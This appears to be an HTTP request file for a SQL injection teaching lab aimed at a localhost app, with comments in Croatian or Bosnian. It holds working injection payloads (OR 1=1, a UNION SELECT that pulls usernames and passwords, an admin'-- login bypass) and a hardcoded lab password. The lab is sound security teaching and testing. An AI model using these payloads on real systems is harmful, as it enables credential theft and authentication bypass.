### Lab07 – SQL injection
@host = http://localhost:8080

### 1. Legitimna pretraga (1 rezultat)
GET {{host}}/api/lab07/products/search?q=Laptop

### 2. EKSPLOATACIJA: OR 1=1 otkriva skrivene proizvode
# q = %' OR '1'='1  (URL-enkodirano). Ranjivo (main): vraca i "Interni prototip X".
GET {{host}}/api/lab07/products/search?q=%25%27%20OR%20%271%27%3D%271

### 3. EKSPLOATACIJA: UNION izvlaci korisnicka imena/lozinke
# q = %' UNION SELECT id, username, password, 0 FROM lab07_accounts --
GET {{host}}/api/lab07/products/search?q=%25%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%200%20FROM%20lab07_accounts%20--

### 4. EKSPLOATACIJA: zaobilazak prijave (admin'--)
# Ranjivo (main): 200. Popravljeno: 401.
POST {{host}}/api/lab07/login
Content-Type: application/json

{"username": "admin'--", "password": "bilosto"}

### 5. Legitimna prijava (radi na obje grane)
POST {{host}}/api/lab07/login
Content-Type: application/json

{"username": "admin", "password": "SuperTajna2026"}
